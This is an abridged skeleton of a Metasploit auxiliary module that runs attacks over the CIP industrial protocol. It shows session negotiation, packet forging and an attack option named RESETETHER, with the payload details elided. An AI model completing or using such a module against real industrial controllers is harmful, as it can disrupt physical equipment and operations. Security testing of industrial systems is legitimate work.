...
class MetasploitModule < Msf::Auxiliary
  ...
  def run
    ...
    print_status "CIP - Running #{attack} attack."
    sid = req_session
    if sid
      forge_packet(sid, payload(attack))
      print_status "CIP - #{attack} attack complete."
    end
  end
  ...
  def forge_packet(sessionid, payload)
    ...
    begin
      ...
      print_error("CIP - Interrupt during payload")
      raise $ERROR_INFO
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
      print_error("CIP - Network error during payload")
      return nil
    end
  end
  ...
  def req_session
    begin
      ...
      if response
        ...
        if session_id
          print_status("CIP - Got session id: 0x" + session_id.to_s(16))
        else
          print_error("CIP - Got invalid session id, aborting.")
          return nil
        end
      else
      ...
      print_error("CIP - Interrupt during session negotiation")
      raise $ERROR_INFO
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused => e
      print_error("CIP - Network error during session negotiation: #{e}")
      return nil
    end
    return session_id
  end
  ...
  def payload(attack)
    ...
    when 'RESETETHER'
      ...
      print_error("CIP - Invalid attack option.")
      return nil
    end
  end
end
